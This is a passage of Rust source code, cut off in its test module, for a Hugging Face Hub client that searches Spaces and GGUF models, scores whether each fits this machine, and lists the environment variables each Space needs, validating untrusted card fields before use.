//! Hugging Face Hub client: search Spaces and GGUF models, annotate each with a
//! compatibility verdict for this machine. Verdicts are honest guesses from
//! metadata; the store never claims more than "maybe" without a real run.

use std::collections::{BTreeSet, HashMap};
use std::sync::atomic::Ordering;
use std::sync::Mutex;
use std::time::{Duration, Instant};

use regex::Regex;
use serde::{Deserialize, Serialize};
use tokio::task::JoinSet;

use crate::error::{Error, Result};
use crate::state::AppState;

const HF: &str = "https://huggingface.co/api";
const HF_SITE: &str = "https://huggingface.co";

/// A cached Store search result stays fresh for this long before a search
/// re-fetches its detail and secrets (#67).
const CACHE_TTL: Duration = Duration::from_secs(600);

/// Space source files are grepped for env var names, never executed; a
/// generous cap keeps a single hostile Space from turning a search into a
/// multi-megabyte download (#57).
const MAX_SOURCE_BYTES: usize = 256 * 1024;

#[derive(Debug, Clone, Copy, Serialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum Compat {
    Ready,
    Maybe,
    Incompatible,
}

#[derive(Debug, Clone, Serialize)]
pub struct SpaceSummary {
    pub id: String,
    pub author: String,
    pub name: String,
    pub sdk: Option<String>,
    pub sdk_version: Option<String>,
    pub likes: u64,
    pub hardware: Option<String>,
    pub app_port: u16,
    /// entry file for gradio/streamlit Spaces (HF runs `python app.py` itself)
    pub app_file: String,
    pub title: Option<String>,
    pub emoji: Option<String>,
    pub compat: Compat,
    pub compat_reason: Option<String>,
    /// Env var names the Space's source reads that are not part of the
    /// container's default environment; the user must supply them (#57).
    #[serde(default)]
    pub secrets: Vec<String>,
    /// One-line summary HF generates for the Space ("Generate images from
    /// text prompts"); only the semantic search endpoint returns it.
    pub description: Option<String>,
    /// HF's category label ("Image Generation"); same source as `description`.
    pub category: Option<String>,
}

/// One page of Store results plus the opaque cursor for the next page, or
/// `None` once the listing is exhausted.
#[derive(Debug, Clone, Serialize)]
pub struct SpacePage {
    pub items: Vec<SpaceSummary>,
    pub next_cursor: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct ModelPage {
    pub items: Vec<ModelSummary>,
    pub next_cursor: Option<String>,
}

/// Category slugs HF's Spaces semantic search accepts; anything else is
/// rejected by the Hub with a 400, so it is validated here first.
pub const SPACE_CATEGORIES: &[&str] = &[
    "image-generation",
    "video-generation",
    "text-generation",
    "language-translation",
    "speech-synthesis",
    "voice-cloning",
    "face-recognition",
    "object-detection",
    "pose-estimation",
    "text-analysis",
    "sentiment-analysis",
    "question-answering",
    "code-generation",
    "data-visualization",
    "3d-modeling",
    "image-editing",
    "background-removal",
    "image-upscaling",
    "ocr",
    "document-analysis",
    "visual-qa",
    "image-captioning",
    "chatbots",
    "text-summarization",
    "music-generation",
    "medical-imaging",
    "financial-analysis",
    "game-ai",
    "model-benchmarking",
    "fine-tuning-tools",
    "dataset-creation",
    "anomaly-detection",
    "recommendation-systems",
    "character-animation",
    "style-transfer",
    "agent-environment",
    "image",
    "other",
];

/// Pipeline tags the Models tab can filter on; both are what Ollama serves.
pub const MODEL_PIPELINES: &[&str] = &["text-generation", "image-text-to-text"];

/// A semantic search answer is a fixed batch (about 100 Spaces, no server
/// paging), so it is kept whole and sliced locally; the cursor is the offset.
const SEMANTIC_TTL: Duration = Duration::from_secs(600);

impl SpaceSummary {
    /// Spaces on a GPU tier hold VRAM of their own; CPU tiers (and Spaces
    /// with no tier at all) run without the device. Mirrors `spaceWantsGpu`
    /// in the Store screen.
    pub fn wants_gpu(&self) -> bool {
        self.hardware
            .as_deref()
            .map(|h| !h.starts_with("cpu"))
            .unwrap_or(false)
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct ModelSummary {
    pub id: String,
    pub author: String,
    pub name: String,
    pub downloads: u64,
    pub likes: u64,
    pub pipeline_tag: Option<String>,
    pub compat: Compat,
    pub compat_reason: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct GgufFile {
    pub filename: String,
    pub quant: String,
    pub size_bytes: u64,
    pub fits: &'static str,
}

// ---- raw API shapes -------------------------------------------------------

/// Shape shared by the listing endpoint (`/api/spaces`, has `cardData`), the
/// detail endpoint, and the semantic search endpoint (no `cardData`, but
/// top-level `title` / `emoji` / `ai_*` fields).
#[derive(Deserialize, Clone)]
pub struct RawSpace {
    id: String,
    #[serde(default)]
    author: Option<String>,
    #[serde(default)]
    sdk: Option<String>,
    #[serde(default)]
    likes: u64,
    #[serde(default, rename = "cardData")]
    card: Option<RawCard>,
    #[serde(default)]
    runtime: Option<RawRuntime>,
    #[serde(default)]
    title: Option<String>,
    #[serde(default)]
    emoji: Option<String>,
    #[serde(default, rename = "ai_short_description")]
    description: Option<String>,
    #[serde(default, rename = "ai_category")]
    category: Option<String>,
}

impl RawSpace {
    /// The detail endpoint is authoritative for card and runtime, but never
    /// carries the `ai_*` fields, so those come from the listing entry.
    fn merge_detail(self, detail: RawSpace) -> RawSpace {
        RawSpace {
            title: self.title.or(detail.title),
            emoji: self.emoji.or(detail.emoji),
            description: self.description.or(detail.description),
            category: self.category.or(detail.category),
            ..detail
        }
    }
}

#[derive(Deserialize, Default, Clone)]
struct RawCard {
    #[serde(default)]
    title: Option<String>,
    #[serde(default)]
    emoji: Option<String>,
    #[serde(default)]
    app_port: Option<u16>,
    #[serde(default)]
    app_file: Option<String>,
    #[serde(default)]
    sdk: Option<String>,
    /// Card YAML lets authors write `sdk_version: 3.5`, which arrives as a number.
    #[serde(default, deserialize_with = "string_or_number")]
    sdk_version: Option<String>,
}

fn string_or_number<'de, D: serde::Deserializer<'de>>(
    d: D,
) -> std::result::Result<Option<String>, D::Error> {
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum V {
        S(String),
        N(serde_json::Number),
        Other(serde::de::IgnoredAny),
    }
    Ok(match Option::<V>::deserialize(d)? {
        Some(V::S(s)) => Some(s),
        Some(V::N(n)) => Some(n.to_string()),
        Some(V::Other(_)) | None => None,
    })
}

#[derive(Deserialize, Default, Clone)]
struct RawRuntime {
    #[serde(default)]
    stage: Option<String>,
    #[serde(default)]
    hardware: Option<RawHardware>,
}

#[derive(Deserialize, Default, Clone)]
struct RawHardware {
    #[serde(default)]
    requested: Option<String>,
    #[serde(default)]
    current: Option<String>,
}

#[derive(Deserialize)]
struct RawModel {
    id: String,
    #[serde(default)]
    author: Option<String>,
    #[serde(default)]
    downloads: u64,
    #[serde(default)]
    likes: u64,
    #[serde(default)]
    pipeline_tag: Option<String>,
    #[serde(default)]
    siblings: Vec<RawSibling>,
}

#[derive(Deserialize)]
struct RawSibling {
    rfilename: String,
    #[serde(default)]
    size: Option<u64>,
}

// ---- Spaces ---------------------------------------------------------------

/// Cached summaries cut repeat detail + secrets fetches for Spaces the Store
/// tab has already scored this session (#67); a request superseded mid-flight
/// by a newer search aborts instead of finishing its detail fan-out.
pub async fn search_spaces(
    state: &AppState,
    query: &str,
    category: Option<&str>,
    cursor: Option<&str>,
    limit: usize,
) -> Result<SpacePage> {
    let limit = limit.clamp(1, 60);
    let query = query.trim();
    let category = category.map(str::trim).filter(|c| !c.is_empty());
    if let Some(c) = category {
        if !SPACE_CATEGORIES.contains(&c) {
            return Err(Error::Other(format!("unknown Space category `{c}`")));
        }
    }
    let cursor = cursor.map(str::trim).filter(|c| !c.is_empty());

    // The plain listing (most liked first) pages server-side through the
    // `Link` header; a query or category goes through HF's semantic search,
    // which answers with one fixed batch that is sliced locally.
    let (raw, next_cursor) = if query.is_empty() && category.is_none() {
        list_spaces(state, cursor, limit).await?
    } else {
        semantic_spaces(state, query, category, cursor, limit).await?
    };
    let items = annotate_spaces(state, raw).await;
    Ok(SpacePage { items, next_cursor })
}

async fn list_spaces(
    state: &AppState,
    cursor: Option<&str>,
    limit: usize,
) -> Result<(Vec<RawSpace>, Option<String>)> {
    let mut url = format!("{HF}/spaces?limit={limit}&sort=likes&direction=-1&full=true");
    if let Some(c) = cursor {
        url.push_str(&format!("&cursor={}", urlencode(c)));
    }
    let token = state.hf_token();
    get_page::<Vec<RawSpace>>(&state.http, &url, token.as_deref()).await
}

async fn semantic_spaces(
    state: &AppState,
    query: &str,
    category: Option<&str>,
    cursor: Option<&str>,
    limit: usize,
) -> Result<(Vec<RawSpace>, Option<String>)> {
    let key = format!("{query}\u{0}{}", category.unwrap_or(""));
    let cached = state
        .semantic_cache
        .lock()
        .ok()
        .and_then(|m| m.get(&key).cloned())
        .filter(|(_, at)| at.elapsed() < SEMANTIC_TTL)
        .map(|(v, _)| v);
    let all = match cached {
        Some(v) => v,
        None => {
            let mut url = format!("{HF}/spaces/semantic-search?");
            if !query.is_empty() {
                url.push_str(&format!("q={}&", urlencode(query)));
            }
            if let Some(c) = category {
                url.push_str(&format!("category={}&", urlencode(c)));
            }
            let token = state.hf_token();
            let mut v: Vec<RawSpace> = get(&state.http, &url, token.as_deref()).await?;
            // With no query the relevance order is meaningless; a category
            // browse reads like the store front: most liked first.
            if query.is_empty() {
                v.sort_by_key(|s| std::cmp::Reverse(s.likes));
            }
            if let Ok(mut m) = state.semantic_cache.lock() {
                m.insert(key, (v.clone(), Instant::now()));
            }
            v
        }
    };
    let offset: usize = match cursor {
        Some(c) => c
            .parse()
            .map_err(|_| Error::Other(format!("bad cursor `{c}`")))?,
        None => 0,
    };
    let end = offset.saturating_add(limit).min(all.len());
    let page = all
        .get(offset..end)
        .map(<[RawSpace]>::to_vec)
        .unwrap_or_default();
    let next = (end < all.len()).then(|| end.to_string());
    Ok((page, next))
}

/// Compat verdict, hardware tier and secrets for each raw entry, in order.
/// Entries whose detail fetch is aborted by a newer search are dropped.
async fn annotate_spaces(state: &AppState, raw: Vec<RawSpace>) -> Vec<SpaceSummary> {
    let http = state.http.clone();
    let token = state.hf_token();
    let has_gpu = state.has_gpu();

    let my_gen = state.search_generation.fetch_add(1, Ordering::SeqCst) + 1;

    let mut results: Vec<Option<SpaceSummary>> = vec![None; raw.len()];
    let mut pending: Vec<(usize, RawSpace)> = Vec::new();
    for (i, s) in raw.into_iter().enumerate() {
        match cache_get(&state.space_cache, &s.id) {
            Some(mut summary) => {
                // A hit from the plain listing has no `ai_*` fields; the
                // semantic entry that found it now does.
                summary.description = s.description.or(summary.description);
                summary.category = s.category.or(summary.category);
                results[i] = Some(summary)
            }
            None => pending.push((i, s)),
        }
    }

    if !pending.is_empty() {
        // Hardware tier and secrets both need the detail endpoint / source
        // text; fetch them concurrently, one task per Space still uncached.
        let mut set = JoinSet::new();
        for (i, s) in pending {
            let http = http.clone();
            let token = token.clone();
            let app_file_hint = s
                .card
                .as_ref()
                .and_then(|c| c.app_file.clone())
                .filter(|f| safe_app_file(f))
                .unwrap_or_else(|| "app.py".to_string());
            set.spawn(async move {
                let detail =
                    get::<RawSpace>(&http, &format!("{HF}/spaces/{}", s.id), token.as_deref())
                        .await
                        .ok();
                let secrets = detect_secrets(&http, token.as_deref(), &s.id, &app_file_hint).await;
                (i, s, detail, secrets)
            });
        }
        while let Some(joined) = set.join_next().await {
            if state.search_generation.load(Ordering::SeqCst) != my_gen {
                // A newer search has started; stop spending calls on this one.
                set.abort_all();
                break;
            }
            if let Ok((i, s, detail, secrets)) = joined {
                let id = s.id.clone();
                let detail_ok = detail.is_some();
                // Semantic search entries have no card; the detail carries it.
                let (s, rt) = match detail {
                    Some(d) => {
                        let rt = d.runtime.clone();
                        (s.merge_detail(d), rt)
                    }
                    None => (s, None),
                };
                let summary = summarize_space(s, rt, has_gpu, detail_ok, secrets);
                if detail_ok {
                    cache_put(&state.space_cache, id, summary.clone());
                }
                results[i] = Some(summary);
            }
        }
    }

    results.into_iter().flatten().collect()
}

/// Details for one Space (used at launch time); always fetched live, never
/// from the Store cache, so the compat gate is checked fresh before a run.
pub async fn space(state: &AppState, id: &str) -> Result<SpaceSummary> {
    validate_repo(id)?;
    let token = state.hf_token();
    let d: RawSpace = get(&state.http, &format!("{HF}/spaces/{id}"), token.as_deref()).await?;
    let rt = d.runtime.clone();
    let app_file_hint = d
        .card
        .as_ref()
        .and_then(|c| c.app_file.clone())
        .filter(|f| safe_app_file(f))
        .unwrap_or_else(|| "app.py".to_string());
    let secrets = detect_secrets(&state.http, token.as_deref(), id, &app_file_hint).await;
    Ok(summarize_space(d, rt, state.has_gpu(), true, secrets))
}

fn cache_get(
    cache: &Mutex<HashMap<String, (SpaceSummary, Instant)>>,
    id: &str,
) -> Option<SpaceSummary> {
    let map = cache.lock().ok()?;
    let (summary, at) = map.get(id)?;
    (at.elapsed() < CACHE_TTL).then(|| summary.clone())
}

fn cache_put(
    cache: &Mutex<HashMap<String, (SpaceSummary, Instant)>>,
    id: String,
    summary: SpaceSummary,
) {
    if let Ok(mut map) = cache.lock() {
        map.insert(id, (summary, Instant::now()));
    }
}

fn summarize_space(
    s: RawSpace,
    runtime: Option<RawRuntime>,
    has_gpu: bool,
    detail_ok: bool,
    secrets: Vec<String>,
) -> SpaceSummary {
    let (author, name) = split_repo(&s.id);
    let author = s.author.unwrap_or(author);
    let card = s.card.unwrap_or_default();
    let sdk = s.sdk.or(card.sdk);
    let app_port = card.app_port.unwrap_or(match sdk.as_deref() {
        Some("streamlit") => 8501,
        _ => 7860,
    });
    let app_file = card
        .app_file
        .filter(|f| safe_app_file(f))
        .unwrap_or_else(|| "app.py".to_string());
    let sdk_version = card.sdk_version.filter(|v| safe_sdk_version(v));
    let runtime = runtime.unwrap_or_default();
    let hardware = runtime.hardware.and_then(|h| h.requested.or(h.current));
    let (mut compat, mut reason) = space_compat(
        sdk.as_deref(),
        runtime.stage.as_deref(),
        hardware.as_deref(),
        has_gpu,
    );
    // A failed detail fetch (429, timeout) must never read as Ready: the
    // hardware tier and stage above are simply unknown, not confirmed CPU (#72).
    if !detail_ok && compat != Compat::Incompatible {
        compat = Compat::Maybe;
        reason = Some("could not read hardware tier".into());
    } else if !secrets.is_empty() && compat == Compat::Ready {
        compat = Compat::Maybe;
        reason = Some(format!("Needs secrets: {}", secrets.join(", ")));
    }
    SpaceSummary {
        id: s.id,
        author,
        name,
        sdk,
        sdk_version,
        likes: s.likes,
        hardware,
        app_port,
        app_file,
        title: card.title.or(s.title),
        emoji: card.emoji.or(s.emoji),
        compat,
        compat_reason: reason,
        secrets,
        description: s.description,
        category: s.category,
    }
}

/// `stage` is HF's own build/run state. Only a Space that built on HF has an
/// image in `registry.hf.space`; a broken one cannot be pulled at all.
fn space_compat(
    sdk: Option<&str>,
    stage: Option<&str>,
    hw: Option<&str>,
    has_gpu: bool,
) -> (Compat, Option<String>) {
    match stage {
        Some("RUNNING")
        | Some("SLEEPING")
        | Some("PAUSED")
        | Some("RUNNING_APP_STARTING")
        | None => {}
        Some(other) => {
            return (
                Compat::Incompatible,
                Some(format!(
                    "Space is `{other}` on Hugging Face; no image to pull"
                )),
            )
        }
    }
    match sdk {
        Some("static") => {
            return (
                Compat::Incompatible,
                Some("Static HTML Space; nothing to run locally".into()),
            )
        }
        Some("gradio") | Some("streamlit") | Some("docker") => {}
        Some(other) => {
            return (
                Compat::Maybe,
                Some(format!("Unknown SDK `{other}`; image may still run")),
            )
        }
        None => return (Compat::Maybe, Some("SDK not declared".into())),
    }
    let wants_gpu = hw.map(|h| !h.starts_with("cpu")).unwrap_or(false);
    match (wants_gpu, has_gpu) {
        (false, _) => (Compat::Ready, None),
        (true, true) => (
            Compat::Maybe,
            Some(format!(
                "Space asks for `{}` on HF; will use the local GPU, VRAM may differ",
                hw.unwrap_or("gpu")
            )),
        ),
        (true, false) => (
            Compat::Incompatible,
            Some(format!(
                "Space needs a GPU (`{}`); none available",
                hw.unwrap_or("gpu")
            )),
        ),
    }
}

// ---- Models ---------------------------------------------------------------

pub async fn search_models(
    state: &AppState,
    query: &str,
    pipeline: Option<&str>,
    cursor: Option<&str>,
    limit: usize,
) -> Result<ModelPage> {
    let limit = limit.clamp(1, 60);
    let pipeline = pipeline.map(str::trim).filter(|p| !p.is_empty());
    if let Some(p) = pipeline {
        if !MODEL_PIPELINES.contains(&p) {
            return Err(Error::Other(format!("unknown pipeline `{p}`")));
        }
    }
    let token = state.hf_token();
    let mut cursor = cursor
        .map(str::trim)
        .filter(|c| !c.is_empty())
        .map(str::to_string);
    let mut items = Vec::new();
    // A diffusion or embedding GGUF (sd-turbo) pulls fine and then 500s on
    // /api/generate; there is nothing the user can do with it here, so it is
    // dropped rather than shown as Incompatible. A page can lose every entry
    // that way, so keep paging (bounded) until something is left to show.
    for _ in 0..5 {
        let mut url = format!("{HF}/models?limit={limit}&filter=gguf&sort=downloads&direction=-1");
        if !query.trim().is_empty() {
            url.push_str(&format!("&search={}", urlencode(query.trim())));
        }
        if let Some(p) = pipeline {
            url.push_str(&format!("&pipeline_tag={}", urlencode(p)));
        }
        if let Some(c) = &cursor {
            url.push_str(&format!("&cursor={}", urlencode(c)));
        }
        let (raw, next): (Vec<RawModel>, _) = get_page(&state.http, &url, token.as_deref()).await?;
        items.extend(
            raw.into_iter()
                .map(summarize_model)
                .filter(|m| m.compat != Compat::Incompatible),
        );
        cursor = next;
        if !items.is_empty() || cursor.is_none() {
            break;
        }
    }
    Ok(ModelPage {
        items,
        next_cursor: cursor,
    })
}

fn summarize_model(m: RawModel) -> ModelSummary {
    let (author, name) = split_repo(&m.id);
    let author = m.author.unwrap_or(author);
    let (compat, reason) = match m.pipeline_tag.as_deref() {
        Some("text-generation") => (Compat::Ready, None),
        None => (
            Compat::Maybe,
            Some("No pipeline tag on the Hub; may not be a chat model".into()),
        ),
        Some("image-text-to-text") => (
            Compat::Maybe,
            Some("Vision model; needs a matching mmproj file, chat UI is text only".into()),
        ),
        Some(other) => (
            Compat::Incompatible,
            Some(format!(
                "Ollama serves text generation GGUF only; this is `{other}`"
            )),
        ),
    };
    ModelSummary {
        id: m.id,
        author,
        name,
        downloads: m.downloads,
        likes: m.likes,
        pipeline_tag: m.pipeline_tag,
        compat,
        compat_reason: reason,
    }
}

/// GGUF files in a repo, smallest first, with a fit verdict against `budget_mb`,
/// the accelerator's effective memory (`RuntimeStatus::effective_memory_mb`).
pub async fn model_files(state: &AppState, repo: &str) -> Result<Vec<GgufFile>> {
    validate_repo(repo)?;
    let budget_mb = state.memory_budget_mb();
    let token = state.hf_token();
    let m: RawModel = get(
        &state.http,
        &format!("{HF}/models/{repo}?blobs=true"),
        token.as_deref(),
    )
    .await?;
    let quant_re = Regex::new(r"(?i)[-_.]((?:I?Q\d[A-Z0-9_]*)|BF16|F16|F32|FP16)\.gguf$").unwrap();
    let shard_re = Regex::new(r"-\d{5}-of-\d{5}\.gguf$").unwrap();
    let mut files: Vec<GgufFile> = m
        .siblings
        .into_iter()
        .filter(|s| pullable_gguf(&s.rfilename, &shard_re))
        .filter_map(|s| {
            // Ollama names the file by its quant tag; a file it cannot name it
            // cannot pull, so drop it instead of offering `:UNKNOWN`.
            let quant = quant_re
                .captures(&s.rfilename)
                .and_then(|c| c.get(1))
                .map(|m| m.as_str().to_ascii_uppercase())?;
            let size = s.size.unwrap_or(0);
            Some(GgufFile {
                fits: fit(size, budget_mb),
                filename: s.rfilename,
                quant,
                size_bytes: size,
            })
        })
        .collect();
    files.sort_by_key(|f| f.size_bytes);
    Ok(files)
}

/// Files `ollama pull hf.co/<repo>:<quant>` can actually fetch: a single GGUF
/// at the repo root. Ollama does not look into subdirectories (unsloth keeps
/// its IQ quants in folders, which fails with "file does not exist"), cannot
/// join `-00001-of-0000N` shards, and mmproj files are not models.
fn pullable_gguf(name: &str, shard_re: &Regex) -> bool {
    let lower = name.to_ascii_lowercase();
    lower.ends_with(".gguf")
        && !name.contains('/')
        && !shard_re.is_match(name)
        && !lower.contains("mmproj")
}

/// Bytes a GGUF of `size` occupies once loaded: the weights, an eighth for
/// compute buffers, and about 1.5 GB of KV cache at the default context.
pub fn model_need_bytes(size: u64) -> u64 {
    size + size / 8 + 1_500_000_000
}

/// Weights plus ~1.5 GB of KV cache must fit the accelerator's budget to be
/// "gpu"; up to 16 GB of spill is "partial" (CPU offload); beyond that "no".
/// The budget is dedicated VRAM on a discrete card and half of system RAM on a
/// unified part (`hardware::unified_budget_mb`), never the iGPU's carve-out.
fn fit(size: u64, budget_mb: Option<u64>) -> &'static str {
    let Some(vram) = budget_mb else {
        return "partial";
    };
    let vram = vram * 1024 * 1024;
    let need = model_need_bytes(size);
    if need <= vram {
        "gpu"
    } else if need <= vram + 16_000_000_000 {
        "partial"
    } else {
        "no"
    }
}

// ---- helpers --------------------------------------------------------------

async fn get<T: for<'de> Deserialize<'de>>(
    http: &reqwest::Client,
    url: &str,
    token: Option<&str>,
) -> Result<T> {
    let mut req = http.get(url);
    if let Some(t) = token {
        req = req.header("Authorization", format!("Bearer {t}"));
    }
    let resp = req.send().await?;
    if !resp.status().is_success() {
        return Err(Error::Hf(format!("{} -> {}", url, resp.status())));
    }
    Ok(resp.json::<T>().await?)
}

/// `get` plus the next-page cursor from the Hub's `Link: <...cursor=X>;
/// rel="next"` header, `None` on the last page.
async fn get_page<T: for<'de> Deserialize<'de>>(
    http: &reqwest::Client,
    url: &str,
    token: Option<&str>,
) -> Result<(T, Option<String>)> {
    let mut req = http.get(url);
    if let Some(t) = token {
        req = req.header("Authorization", format!("Bearer {t}"));
    }
    let resp = req.send().await?;
    if !resp.status().is_success() {
        return Err(Error::Hf(format!("{} -> {}", url, resp.status())));
    }
    let next = resp
        .headers()
        .get("link")
        .and_then(|v| v.to_str().ok())
        .and_then(next_cursor);
    Ok((resp.json::<T>().await?, next))
}

/// The `cursor` value of the `rel="next"` link, URL-decoded.
fn next_cursor(link: &str) -> Option<String> {
    link.split(',')
        .find(|part| part.contains("rel=\"next\""))
        .and_then(|part| {
            let url = part.trim().strip_prefix('<')?.split('>').next()?;
            url.split(['?', '&'])
                .find_map(|kv| kv.strip_prefix("cursor="))
                .map(urldecode)
        })
}

fn urldecode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 2 < bytes.len() => match u8::from_str_radix(&s[i + 1..i + 3], 16) {
                Ok(b) => {
                    out.push(b);
                    i += 3;
                }
                Err(_) => {
                    out.push(b'%');
                    i += 1;
                }
            },
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Fetch one Space source file, bounded to `MAX_SOURCE_BYTES`; a missing file,
/// a private repo without access, or any other failure is just "nothing found",
/// never an error, since this is a best-effort heuristic on top of the compat
/// verdict, not a requirement to launch.
async fn fetch_raw_bounded(
    http: &reqwest::Client,
    token: Option<&str>,
    id: &str,
    file: &str,
) -> Option<String> {
    let url = format!("{HF_SITE}/spaces/{id}/raw/main/{file}");
    let mut req = http.get(&url);
    if let Some(t) = token {
        req = req.header("Authorization", format!("Bearer {t}"));
    }
    let resp = req.send().await.ok()?;
    if !resp.status().is_success() {
        return None;
    }
    if let Some(len) = resp.content_length() {
        if len > MAX_SOURCE_BYTES as u64 {
            return None;
        }
    }
    let bytes = resp.bytes().await.ok()?;
    let bytes = if bytes.len() > MAX_SOURCE_BYTES {
        &bytes[..MAX_SOURCE_BYTES]
    } else {
        &bytes[..]
    };
    Some(String::from_utf8_lossy(bytes).into_owned())
}

/// Env var names a Space's entry point (and `app.py`, if different) reads
/// that are not part of the container's default environment (#57).
async fn detect_secrets(
    http: &reqwest::Client,
    token: Option<&str>,
    id: &str,
    app_file: &str,
) -> Vec<String> {
    let mut text = String::new();
    if let Some(t) = fetch_raw_bounded(http, token, id, app_file).await {
        text.push_str(&t);
    }
    if app_file != "app.py" {
        if let Some(t) = fetch_raw_bounded(http, token, id, "app.py").await {
            text.push('\n');
            text.push_str(&t);
        }
    }
    if text.is_empty() {
        return Vec::new();
    }
    extract_secret_names(&text)
}

fn extract_secret_names(text: &str) -> Vec<String> {
    let patterns = [
        Regex::new(r#"os\.environ\[\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]\s*\]"#).unwrap(),
        Regex::new(r#"os\.environ\.get\(\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]"#).unwrap(),
        Regex::new(r#"os\.getenv\(\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]"#).unwrap(),
    ];
    let mut names = BTreeSet::new();
    for re in &patterns {
        for cap in re.captures_iter(text) {
            if let Some(m) = cap.get(1) {
                let name = m.as_str();
                if valid_env_name(name) && !is_default_env(name) {
                    names.insert(name.to_string());
                }
            }
        }
    }
    names.into_iter().collect()
}

/// Env var names for a Space's default container (Docker + Gradio runtime, plus
/// `HF_TOKEN`, which is handled separately by the Setup token, #60) never count
/// as secrets the user must supply.
fn is_default_env(name: &str) -> bool {
    matches!(
        name,
        "PORT" | "HF_HOME" | "SYSTEM" | "HF_TOKEN" | "PATH" | "HOME"
    ) || name.starts_with("HF_HUB_")
        || name.starts_with("GRADIO_")
        || name.starts_with("SPACE_")
        || name.starts_with("CUDA_")
        || name.starts_with("PYTHON")
}

/// A name safe to splice as the identifier in `-e NAME=value` (the value
/// itself still goes through `wsl::quote`). Space source is hostile input;
/// this is deliberately case-insensitive (`tryon_url`, not just `TRYON_URL`)
/// because that is what real Space code uses, but still rejects anything with
/// shell metacharacters.
pub fn valid_env_name(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Card fields end up in a shell command (`python {app_file}`) and a Dockerfile
/// (`gradio=={sdk_version}`). Anyone can publish a Space, so these are
/// allowlists: a value that fails falls back to the default, never gets patched.
/// A relative path is fine (`demos/musicgen_app.py`); `..`, hidden
/// segments and an absolute path are not.
fn safe_app_file(f: &str) -> bool {
    !f.is_empty()
        && f.split('/').all(|seg| {
            !seg.is_empty()
                && !seg.starts_with('.')
                && seg
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        })
}

fn safe_sdk_version(v: &str) -> bool {
    !v.is_empty()
        && v.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-'))
}

pub fn validate_repo(id: &str) -> Result<()> {
    let parts: Vec<&str> = id.split('/').collect();
    let seg_ok = |p: &str| {
        !p.is_empty()
            && !p.starts_with('.')
            && p.chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    };
    if parts.len() == 2 && parts.iter().all(|p| seg_ok(p)) {
        Ok(())
    } else {
        Err(Error::Other(format!(
            "`{id}` is not an `owner/name` repo id"
        )))
    }
}

pub fn split_repo(id: &str) -> (String, String) {
    match id.split_once('/') {
        Some((a, n)) => (a.to_string(), n.to_string()),
        None => (String::new(), id.to_string()),
    }
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fit_thresholds() {
        assert_eq!(fit(5_000_000_000, Some(10240)), "gpu");
        assert_eq!(fit(9_000_000_000, Some(10240)), "partial");
        assert_eq!(fit(40_000_000_000, Some(10240)), "no");
        assert_eq!(fit(1, None), "partial");
    }

    #[test]
    fn space_verdicts() {
        let run = Some("RUNNING");
        assert_eq!(
            space_compat(Some("static"), run, None, true).0,
            Compat::Incompatible
        );
        assert_eq!(
            space_compat(Some("gradio"), run, Some("cpu-basic"), false).0,
            Compat::Ready
        );
        assert_eq!(
            space_compat(Some("gradio"), run, Some("zero-a10g"), true).0,
            Compat::Maybe
        );
        assert_eq!(
            space_compat(Some("docker"), run, Some("t4-small"), false).0,
            Compat::Incompatible
        );
        assert_eq!(
            space_compat(
                Some("gradio"),
                Some("RUNTIME_ERROR"),
                Some("cpu-basic"),
                true
            )
            .0,
            Compat::Incompatible
        );
        assert_eq!(
            space_compat(Some("gradio"), Some("SLEEPING"), Some("cpu-basic"), true).0,
            Compat::Ready
        );
    }

    #[test]
    fn link_header_yields_decoded_next_cursor() {
        let link = r#"<https://huggingface.co/api/spaces?limit=3&sort=likes&cursor=eyJhIjoxfQ%3D%3D>; rel="next""#;
        assert_eq!(next_cursor(link).as_deref(), Some("eyJhIjoxfQ=="));
        let two = r#"<https://x/?a=1>; rel="prev", <https://x/?cursor=abc&limit=2>; rel="next""#;
        assert_eq!(next_cursor(two).as_deref(), Some("abc"));
        assert_eq!(next_cursor(r#"<https://x/?a=1>; rel="prev""#), None);
        assert_eq!(next_cursor(""), None);
    }

    #[test]
    fn semantic_entries_take_card_from_detail_and_keep_ai_fields() {
        let listing: RawSpace = serde_json::from_str(
            r#"{"id":"a/b","likes":5,"title":"Sem title","emoji":"x",
                "ai_short_description":"Generate images","ai_category":"Image Generation"}"#,
        )
        .unwrap();
        let detail: RawSpace = serde_json::from_str(
            r#"{"id":"a/b","sdk":"gradio","likes":7,
                "cardData":{"title":"Card title","app_file":"demo.py","app_port":7861},
                "runtime":{"stage":"RUNNING","hardware":{"current":"cpu-basic"}}}"#,
        )
        .unwrap();
        let rt = detail.runtime.clone();
        let s = summarize_space(listing.merge_detail(detail), rt, true, true, vec![]);
        assert_eq!(s.title.as_deref(), Some("Card title"));
        assert_eq!(s.app_file, "demo.py");
        assert_eq!(s.app_port, 7861);
        assert_eq!(s.likes, 7);
        assert_eq!(s.description.as_deref(), Some("Generate images"));
        assert_eq!(s.category.as_deref(), Some("Image Generation"));
        assert_eq!(s.compat, Compat::Ready);
    }

    #[test]
    fn only_root_single_file_ggufs_are_pullable() {
